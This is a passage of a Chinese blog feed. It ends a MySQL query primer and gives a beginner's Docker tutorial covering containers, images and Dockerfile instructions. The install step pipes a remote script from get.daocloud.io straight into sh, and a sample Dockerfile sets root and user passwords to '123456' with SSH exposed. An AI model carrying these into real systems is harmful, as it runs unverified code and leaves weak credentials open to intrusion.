class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select column_name from information_schema.columns where table_name = &#x27;awake_table&#x27;;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200927194927535.png#pic_center" alt="在这里插入图片描述"><br>此处于上面的<code>table_schema</code>同理，在<code>information_schema</code>数据库中的<code>COLUMNS</code>表中放了所有的字段名。其中<code>COLUMN_NAME</code>字段放了所有的字段名，与之对应的<code>TABLE_NAME</code>就是该字段的所对应的表的名字。</p><ul><li><strong>查内容</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select column_name from table_name;<br></code></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20200927195725341.png#pic_center" alt="在这里插入图片描述"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from table_name;<br></code></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20200927200334675.png#pic_center" alt="在这里插入图片描述"><br>这个列出该表的所有内容。</li></ul><p>在这里还能加<code>order by</code> 根据哪个字段排序:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from awake_table order by 1;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200927201114529.png?x-oss-process=image" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200927201129515.png?x-oss-process=image" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200927201139759.png?x-oss-process=image" alt="在这里插入图片描述"><br>比较之下应该可以看出排序的效果~</p><p>还可以根据某个字段逆序排序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from table_name order by 1 desc;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200927201340815.png?x-oss-process=image" alt="在这里插入图片描述"></p><p>目前就整理那么多，这些都是比较基本的需要掌握的，多练习，你会发现更多神奇的骚操作~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.runoob.com/mysql/mysql-tutorial.html&quot;&gt;菜鸟教程传送门&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里只做一些简单的摘记，如果想系统的学习或者针对某个模块进行学习还请参考菜鸟教程的链接。&lt;br&gt;对数据库的操作主要讲究</summary>
      
    
    
    
    <category term="MySQL" scheme="http://www.w4ke.cn/categories/MySQL/"/>
    
    
    <category term="MySQL" scheme="http://www.w4ke.cn/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>Docker简单使用教程</title>
    <link href="http://www.w4ke.cn/2020/11/20/Docker%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <id>http://www.w4ke.cn/2020/11/20/Docker%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</id>
    <published>2020-11-20T12:35:00.000Z</published>
    <updated>2021-12-27T15:11:27.862Z</updated>
    
    <content type="html"><![CDATA[<p>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。</p><p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p><p>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p><p>说白了就是一个开销更低，安装更便捷的虚拟机。</p><p>这里介绍一点简单的Docker使用教程，详细教程参考<a href="https://www.runoob.com/docker/docker-tutorial.html">菜鸟教程</a></p><hr><h1 id="Docker-基本语法"><a href="#Docker-基本语法" class="headerlink" title="Docker 基本语法"></a>Docker 基本语法</h1><h2 id="安装-Docker"><a href="#安装-Docker" class="headerlink" title="安装 Docker"></a>安装 Docker</h2><p><code>Ubuntu</code>下使用命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">apt-get install docker.io<br>curl -sSL https://get.daocloud.io/docker | sh<br></code></pre></td></tr></table></figure><h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker pull + 镜像名:标签<br>eg:docker pull ubuntu:20.04<br></code></pre></td></tr></table></figure><p>Docker 官方提供了Docker Hub仓库，所有用户都可以向Docker Hub贡献自己制作的Docker镜像。</p><h2 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker run -it -p 90:80 ubuntu:20.04   /bin/bash<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020092818252673.png#pic_center" alt="在这里插入图片描述"><br><code>-i</code>  在新容器内指定一个伪终端或终端。<br><code>-t</code>  允许你对容器内的标准输入 (STDIN) 进行交互。<br><code>-p</code>  进行端口映射。<code>90:80</code>指的是将主机的<code>90</code>端口映射到容器的<code>80</code>端口。<br><code>ubuntu:20.04</code> 镜像名:标签，这里调用20.04版本的ubuntu系统，如果本地上没有相关镜像会自动从Docker Hub上下载。<br><code>/bin/bash</code>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 /bin/bash。<br>运行完成以后，直接进入了Docker容器，这里基本上可以把它当成一个真实的ubuntu机进行使用。输入<code>exit</code>退出容器，退出时容器关闭。<br><img src="https://img-blog.csdnimg.cn/20200928190523513.png#pic_center" alt="在这里插入图片描述"></p><p>如果希望建立一个后台运行的Docker容器的话，可以采用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker run -dt -p 90:80 ubuntu:20.04   /bin/bash<br></code></pre></td></tr></table></figure><p><code>-d</code>指的是进行后台运行。</p><h2 id="开启-关闭-容器"><a href="#开启-关闭-容器" class="headerlink" title="开启/关闭 容器"></a>开启/关闭 容器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker ps -a    #列出所有容器<br>docker ps    #列出正在运行的容器<br>docker start + 容器id    #开启容器<br>docker stop  +容器id    #关闭容器<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200928191130433.png?x-oss-process=image" alt="在这里插入图片描述"><br>输出详情介绍：<br><code>CONTAINER ID</code>: 容器 ID。<br><code>IMAGE</code>: 使用的镜像。<br><code>COMMAND</code>: 启动容器时运行的命令。<br><code>CREATED</code>: 容器的创建时间。<br><code>STATUS</code>: 容器状态。<br><code>PORTS</code>: 容器的端口信息和使用的连接类型（tcp\udp）。<br><code>NAMES</code>: 自动分配的容器名称。</p><h2 id="主机连接Docker"><a href="#主机连接Docker" class="headerlink" title="主机连接Docker"></a>主机连接Docker</h2><p>使用<code>exit</code>退出后，Docker默认会关闭掉，使用<code>docker start</code>重启容器但是并没有进入容器，此时可以用<code>docker attach</code>或者<code>docker exec</code>命令来进行连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker attach + 容器id<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020092819264111.png#pic_center" alt="在这里插入图片描述"><br>这个命令有个缺点，使用<code>exit</code>退出后容器不会在后台运行，而是跟原来一样被关闭，而<code>docker exec</code>不会有这个问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker exec -it +容器id  /bin/bash<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020092819291651.png#pic_center" alt="在这里插入图片描述"></p><h2 id="导出-导入容器"><a href="#导出-导入容器" class="headerlink" title="导出/导入容器"></a>导出/导入容器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker export 容器id  &gt; ubuntu.tar<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200928193152138.png#pic_center" alt="在这里插入图片描述"><br>这里将整个容器导出成<code>ubuntu.tar</code>这个包，就可以进行转移。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cat ubuntu.tar | docker import - test/ubuntu:v1<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200928193528990.png#pic_center" alt="在这里插入图片描述"><br>这里将<code>ubuntu.tar</code>导入成镜像，镜像名叫<code>test/ubuntu</code>，标签为<code>v1</code></p><h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker rm +容器id<br></code></pre></td></tr></table></figure><p>正在运行的容器必须先停下再删除<br><img src="https://img-blog.csdnimg.cn/20200928195519611.png?x-oss-process=image" alt="在这里插入图片描述"></p><h2 id="Docker镜像"><a href="#Docker镜像" class="headerlink" title="Docker镜像"></a>Docker镜像</h2><ul><li><p>列出本地主机上的镜像。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker images <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200928195651609.png?x-oss-process=image" alt="在这里插入图片描述"><br><code>REPOSITORY</code>：表示镜像的仓库源<br><code>TAG</code>：镜像的标签<br><code>IMAGE ID</code>：镜像ID<br><code>CREATED</code>：镜像创建时间<br><code>SIZE</code>：镜像大小</p></li><li><p>查找镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker search httpd<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020092820004138.png?x-oss-process=image" alt="在这里插入图片描述"></p></li><li><p>获取镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker pull centos/httpd-24-centos7<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200928200156246.png?x-oss-process=image" alt="在这里插入图片描述"></p></li><li><p>删除镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker rmi +镜像名字:标签<br>或者  docker rmi  镜像id<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200928200449676.png?x-oss-process=image" alt="在这里插入图片描述"></p></li></ul><h2 id="创建镜像"><a href="#创建镜像" class="headerlink" title="创建镜像"></a>创建镜像</h2><ul><li>1.从已经创建的容器中更新镜像，并且提交这个镜像。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker commit -m=&quot;has update&quot; -a=&quot;runoob&quot; e218edb10161 runoob/ubuntu:v2<br></code></pre></td></tr></table></figure>各个参数说明：<br><code>-m</code>: 提交的描述信息<br><code>-a</code>: 指定镜像作者<br><code>e218edb10161</code>：容器 ID<br><code>1275178869/ubuntu:v2</code>: 指定要创建的目标镜像名</li></ul><ul><li>2.使用 Dockerfile 指令来创建一个新的镜像。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#Dockerfile 内容<br>FROM    centos:6.7<br>MAINTAINER      Fisher &quot;fisher@sudops.com&quot;<br><br>RUN     /bin/echo &#x27;root:123456&#x27; |chpasswd<br>RUN     useradd runoob<br>RUN     /bin/echo &#x27;runoob:123456&#x27; |chpasswd<br>RUN     /bin/echo -e &quot;LANG=\&quot;en_US.UTF-8\&quot;&quot; &gt;/etc/default/local<br>EXPOSE  22<br>EXPOSE  80<br>CMD     /usr/sbin/sshd -D<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200928201119783.png?x-oss-process=image" alt="在这里插入图片描述"><br>每一个指令都会在镜像上创建一个新的层，每一个指令的前缀都必须是大写的。<br>第一条FROM，指定使用哪个镜像源<br>RUN 指令告诉docker 在镜像内执行命令，安装了什么。。。<br>然后，我们使用 Dockerfile 文件，通过 docker build 命令来构建一个镜像。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker build -t runoob/centos:6.7 .<br></code></pre></td></tr></table></figure><p>不要忘了该命令的最后一个<code>.</code>，这里指的是Dockerfile所在的路径，<code>.</code>表示Dockerfile就在当前路径下。<br><img src="https://img-blog.csdnimg.cn/20200928201538242.png?x-oss-process=image" alt="在这里插入图片描述"><br>查看一下镜像：<br><img src="https://img-blog.csdnimg.cn/20200928201739324.png?x-oss-process=image" alt="在这里插入图片描述"><br>多了一个镜像，就是刚才创建的镜像。<br>具体Dockerfile的编写后面会有介绍，这里就不赘叙了。</p><h2 id="设置镜像标签"><a href="#设置镜像标签" class="headerlink" title="设置镜像标签"></a>设置镜像标签</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker tag 镜像id 镜像名字:标签<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200928202043410.png?x-oss-process=image" alt="在这里插入图片描述"></p><hr><h1 id="Docker之Dockerfile"><a href="#Docker之Dockerfile" class="headerlink" title="Docker之Dockerfile"></a>Docker之Dockerfile</h1><p><a href="https://www.runoob.com/docker/docker-dockerfile.html">Dockerfile菜鸟教程</a></p><p>说白了，Dockerfile就是告诉Docker调用哪个镜像，执行哪些命令，执行完之后将容器导出为镜像。</p><p>Dockerfile的编写主要是各种指令的调用，堆在一起就好了。</p><h2 id="FROM-和-RUN-指令"><a href="#FROM-和-RUN-指令" class="headerlink" title="FROM 和 RUN 指令"></a>FROM 和 RUN 指令</h2><p><code>FROM</code>：定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。</p><p><code>RUN</code>：用于执行后面跟着的命令行命令。<br>举个栗子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">FROM nginx       #调用nginx镜像<br>RUN echo &#x27;这是一个本地构建的nginx镜像&#x27; &gt; /usr/share/nginx/html/index.html     #在/usr/share/nginx/html/目录下建一个index.html内容为  &#x27;这是一个本地构建的nginx镜像&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/202009282202546.png#pic_center" alt="在这里插入图片描述"><br>文件名必须是<code>Dockerfile</code>一点都不能错，内容就是这两行内容。</p><p>然后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker build -t 镜像名称:标签 .<br></code></pre></td></tr></table></figure><p>注意千万别忘了最后那个点！<br><img src="https://img-blog.csdnimg.cn/20200928224009122.png?x-oss-process=image" alt="在这里插入图片描述"><br>查看一下镜像，发现多了一个镜像叫nginx<br><img src="https://img-blog.csdnimg.cn/20200928224131382.png#pic_center" alt="在这里插入图片描述"><br>尝试着运行一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker run -it -p 900:80 nginx:v1 /bin/bash<br></code></pre></td></tr></table></figure><p>在这里将主机的900端口映射到容器的80端口，因为访问网页服务器都是默认在80端口。<br>然后访问一波：<br><img src="https://img-blog.csdnimg.cn/20200928231050319.png?x-oss-process=image" alt="在这里插入图片描述"><br>Successful!</p><h2 id="COPY指令"><a href="#COPY指令" class="headerlink" title="COPY指令"></a>COPY指令</h2><p>复制指令，从上下文目录中复制文件或者目录到容器里指定路径。</p><p>这个命令最强大的作用是可以将主机的文件拷贝到容器中，不然需要建共享文件夹等很麻烦的操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">COPY ./file  /tmp<br></code></pre></td></tr></table></figure><p>将<code>file</code>目录以及其下的子目录全部拷贝到容器的<code>/tmp</code>文件夹中，接下去对文件的操作写在RUN指令中即可。</p><h2 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h2><p>类似于 RUN 指令，用于运行程序，但二者运行的时间点不同：</p><ul><li><code>CMD</code> 在docker run 时运行。</li><li><code>RUN</code>是在 docker build。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">CMD &lt;shell 命令&gt; <br>CMD [&quot;&lt;可执行文件或命令&gt;&quot;,&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...] <br>CMD [&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...]  # 该写法是为 ENTRYPOINT 指令指定的程序提供默认参数<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">CMD[&quot;service&quot;,&quot;apache2&quot;,&quot;start&quot;]<br></code></pre></td></tr></table></figure><p>在run容器的时候开启<code>Apache2</code>服务。</p><p><font color="red"><strong>注意：如果 Dockerfile 中如果存在多个 CMD 指令，仅最后一个生效。</strong></font></p><p>所以如果需要执行的命令比较多的话可以写一个sh脚本，直接在CMD里运行这个脚本即可。</p><h2 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h2><p>仅仅只是声明端口。<br>作用：</p><ul><li><p>帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射。</p></li><li><p>在运行时使用随机端口映射时，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]<br></code></pre></td></tr></table></figure><h2 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h2><p>指定工作目录。用 WORKDIR 指定的工作目录，会在构建镜像的每一层中都存在。（WORKDIR 指定的工作目录，必须是提前创建好的）。</p><p>docker build 构建镜像过程中的，每一个 RUN 命令都是新建的一层。只有通过 WORKDIR 创建的目录才会一直存在。</p><h2 id="一个具体的示例"><a href="#一个具体的示例" class="headerlink" title="一个具体的示例"></a>一个具体的示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">FROM ctftraining/base_image_nginx_mysql_php_56        #导入镜像<br><br>COPY src /var/www/html                                #将文件复制到/var/www/html<br><br>RUN chown -R www-data:www-data /var/www/html/uploads &amp;&amp; \                #执行这三条指令<br>    mv /var/www/html/flag.sh / &amp;&amp; \<br>    chmod +x /flag.sh<br><br>EXPOSE 80                            #声明80端口<br><br>CMD[&quot;service&quot;,&quot;apache2&quot;,&quot;start&quot;]                 #开启容器时<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。&lt;/p&gt;
&lt;p&gt;Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。&lt;/p&gt;
&lt;p&gt;容器是</summary>
      
    
    
    
    <category term="Docker" scheme="http://www.w4ke.cn/categories/Docker/"/>
    
    
    <category term="Docker" scheme="http://www.w4ke.cn/tags/Docker/"/>
    
  </entry>
  
</feed>
